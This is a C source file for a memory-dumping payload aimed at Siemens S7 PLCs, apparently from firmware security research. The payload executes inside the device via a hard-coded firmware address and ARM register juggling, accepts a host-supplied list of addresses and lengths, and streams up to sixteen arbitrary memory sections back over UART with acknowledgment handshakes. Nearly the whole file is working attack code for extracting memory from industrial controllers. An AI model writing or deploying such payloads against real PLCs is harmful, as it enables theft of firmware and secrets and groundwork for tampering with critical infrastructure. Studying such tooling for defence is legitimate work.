/**
 * @file dump_mem_multisection.c
 * @brief Multi-section memory dumping payload for Siemens S7 PLC
 * 
 * This enhanced payload supports dumping multiple memory sections sequentially,
 * with client acknowledgment required between each section. This allows the
 * client to save each section before proceeding to the next.
 * 
 * Protocol:
 * 1. Client sends section array to payload
 * 2. Payload dumps each section and sends to client
 * 3. Payload waits for ACK from client before next section
 * 4. Process repeats for all sections
 */

#include <stdbool.h>
#include <stdint.h>

#include "../lib/print.h"
#include "../lib/read.h"
#include "memory.h"

/* Protocol messages */
char greeting[] = "Ok\0";
char section_start_msg[] = "SECTION_START\0";
char section_done_msg[] = "SECTION_DONE\0";
char all_done_msg[] = "ALL_DONE\0";

/**
 * @brief Structure representing a single memory section to dump
 */
typedef struct {
    uint32_t address;   /* Starting address of section */
    uint32_t length;    /* Number of bytes to dump */
} memory_section_t;

/**
 * @brief Multi-section dump configuration
 */
typedef struct {
    uint32_t num_sections;           /* Number of sections to dump */
    memory_section_t sections[16];   /* Array of sections (max 16) */
} multisection_config_t;

int (*read_flash_page_calc_crc)(unsigned short start_offset, unsigned int *fl_dw2_stored_crc_out, unsigned int *fl_dw_3_out_num_dwords, unsigned int *fl_dw_4_out, unsigned int *fl_dw_5_out, unsigned int *content_out, unsigned int *calc_crc_out, int use_inline_size, unsigned int *num_wait_cycles) = (int (*)(unsigned short start_offset, unsigned int *fl_dw2_stored_crc_out, unsigned int *fl_dw_3_out_num_dwords, unsigned int *fl_dw_4_out, unsigned int *fl_dw_5_out, unsigned int *content_out, unsigned int *calc_crc_out, int use_inline_size, unsigned int *num_wait_cycles)) 0x13A2C;

/**
 * @brief Safely read a 32-bit value from potentially unaligned memory
 * @param p Pointer to the data to read
 * @return The 32-bit value in little-endian format
 * 
 * This function prevents unaligned memory access faults on ARM processors
 * by reading byte-by-byte and reconstructing the 32-bit value.
 */
static inline uint32_t read_le32(const uint8_t *p) {
    return ((uint32_t)p[0]) | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

int doit_multisection(unsigned char *, unsigned char *) __attribute__((noinline));

/**
 * @brief Entry point for the multi-section memory dump payload
 * @param read_buf Buffer containing section configuration from host
 * @param write_buf Buffer for writing response data
 * @return 0 on success, negative on error
 * 
 * Preserves ARM registers and calls the main dump function.
 */
int _start(unsigned char *read_buf, unsigned char *write_buf) {
    __asm__("stmfd sp!, {r2-r12, lr}");
    __asm__("adr r9, _start");
    
    int res = doit_multisection(read_buf, write_buf);

    __asm("ldmfd sp!, {r2-r12, lr}");
    return res;
}

/**
 * @brief Wait for acknowledgment from client
 * @return 0 if ACK received, -1 on error or timeout
 * 
 * Waits for a single byte ACK (0x00) from the client.
 * If NAK (0xFF) or timeout occurs, returns error.
 */
    int wait_for_client_ack(void) {
        char ack_buf[1];
        int result;
    
    /* Read one byte acknowledgment */
    result = UART_protocol_recv_chunk(ack_buf, sizeof(ack_buf));
    
    if (result < 0) {
        /* Read error */
        return -1;
    }
    
    if (result == 1 && ack_buf[0] == 0x00) {
        /* ACK received */
        return 0;
    }
    
    /* NAK or unexpected response */
    return -1;
}

/**
 * @brief Main multi-section memory dumping function
 * @param read_buf Buffer containing section configuration
 * @param write_buf Buffer for response (unused)
 * @return 0 on success, negative on error
 * 
 * Format of read_buf:
 * - Offset 4: Magic value to detect mode (0xDEADBEEF for multi-section)
 * - Offset 8: Number of sections (4 bytes, uint32)
 * - For each section:
 *   - Address (4 bytes, uint32)
 *   - Length (4 bytes, uint32)
 * 
 * OR for backward compatibility (single section):
 * - Offset 4: Target memory address (4 bytes)
 * - Offset 8: Number of bytes to dump (4 bytes)
 */
int doit_multisection(uint8_t *read_buf, unsigned char *write_buf) {
    uint32_t magic = read_le32(read_buf + 4);
    uint32_t num_sections;
    uint32_t i;
    char *tar_addr;
    uint32_t size;
    int ack_result;
    
    /* Send initial greeting */
    UART_protocol_send_single(greeting, sizeof(greeting));
    
    /* Check if this is multi-section mode or legacy single-section */
    if (magic == 0xDEADBEEF) {
        /* Multi-section mode */
        num_sections = read_le32(read_buf + 8);
        
        /* Validate number of sections */
        if (num_sections == 0 || num_sections > 16) {
            write_buf[0] = 0xFF;  /* Error: invalid section count */
            return -1;
        }
        
        /* Process each section */
        for (i = 0; i < num_sections; i++) {
            /* Calculate offset for this section's data */
            uint32_t section_offset = 12 + (i * 8);
            
            /* Extract section address and length */
            tar_addr = (char *)read_le32(read_buf + section_offset);
            size = read_le32(read_buf + section_offset + 4);
            
            /* Validate section parameters */
            if (size == 0 || size > 0x100000) {  /* Max 1MB per section */
                write_buf[0] = 0xFE;  /* Error: invalid section size */
                return -2;
            }
            
            /* Notify client that section dump is starting */
            UART_protocol_send_single(section_start_msg, sizeof(section_start_msg));
            
            /* Send the memory section data */
            UART_protocol_send_many(tar_addr, size);
            
            /* Notify client that section dump is complete */
            UART_protocol_send_single(section_done_msg, sizeof(section_done_msg));
            
            /* Wait for client acknowledgment before proceeding */
            if (i < num_sections - 1) {  /* Don't wait after last section */
                ack_result = wait_for_client_ack();
                if (ack_result < 0) {
                    write_buf[0] = 0xFD;  /* Error: ACK timeout or NAK */
                    return -3;
                }
            }
        }
        
        /* All sections dumped successfully */
        UART_protocol_send_single(all_done_msg, sizeof(all_done_msg));
        
    } else {
        /* Legacy single-section mode (backward compatibility) */
        size = read_le32(read_buf + 8); 
        tar_addr = (char *)read_le32(read_buf + 4);
        
        /* Validate parameters */
        if (size == 0 || size > 0x100000) {
            write_buf[0] = 0xFE;
            return -2;
        }
        
        /* Dump the single section */
        UART_protocol_send_many(tar_addr, size);
    }
    
    write_buf[0] = 0;
    return 0;
}
